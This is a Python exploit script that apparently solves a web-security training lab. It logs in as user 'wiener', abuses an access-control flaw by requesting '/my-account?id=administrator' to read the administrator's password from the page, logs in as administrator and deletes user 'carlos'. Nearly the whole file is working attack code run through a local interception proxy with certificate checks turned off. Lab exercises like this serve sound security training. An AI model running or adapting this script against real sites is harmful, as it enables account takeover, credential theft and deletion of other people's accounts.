import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf_token(session, url):
    res = session.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(res.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})["value"]
    return csrf

def delete_user(session, url):
    # Get csrf token 
    login_url = url + "/login"
    csrf_token = get_csrf_token(session, login_url)

    #Login as the wiener user
    print("(+) Logging in as the wiener user...")
    login_data = {'csrf': csrf_token, 'username': 'wiener', 'password': 'peter'}
    res = session.post(login_url, data=login_data, verify=False, proxies=proxies)

    if "Log out" in res.text:
        print("(+) Successfully logged in as the wiener user.")

        # Access the admin account
        print("(+) Attempting to exploit access control vulnerabilities...")
        admin_account_url = url + "/my-account?id=administrator"
        res = session.get(admin_account_url, verify=False, proxies=proxies)
        
        if "administrator" in res.text:
            print("(+) Retrieving administrator password...")
            soup = BeautifulSoup(res.text, 'html.parser')
            admin_password = soup.find("input", {'name': 'password'})["value"]
            print(f"(+) Administrator password is: {admin_password}")

            #Login in as adminstrator user
            csrf_token = get_csrf_token(session, login_url)
            admin_data = {'csrf': csrf_token, 'username': 'administrator', 'password': admin_password}
            res = session.post(login_url, data=admin_data, verify=False, proxies=proxies)
            print("(+) Logging in as the administrator user...")
            if "administrator" in res.text:
                print("(+) Successfully logged in as the administrator user.")
                print("(+) Attempting to delete user 'carlos'")
                delete_carlos_user_url = url + "/admin/delete?username=carlos"
                res = session.get(delete_carlos_user_url, verify=False, proxies=proxies)

                if "carlos" not in res.text:
                    print("(+) Successfully deleted carlos user...")
                else:
                    print("(-) Could not delete carlos user...")
                    sys.exit(-1)
            else:
                print("(-) Could not login as the administrator user.")
                sys.exit(-1)
        else:
            print('(-) Could not exploit access control vulnerabilities..')
            sys.exit(-1)

    else:
        print("(-) Could not login as wiener user.")
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: {sys.argv[0]} <url>")
        print(f"(+) Example: {sys.argv[0]} https://www.example.com")
        sys.exit(-1)

    session = requests.session()
    url = sys.argv[1].strip()
    delete_user(session, url)

if __name__ == "__main__":
    main()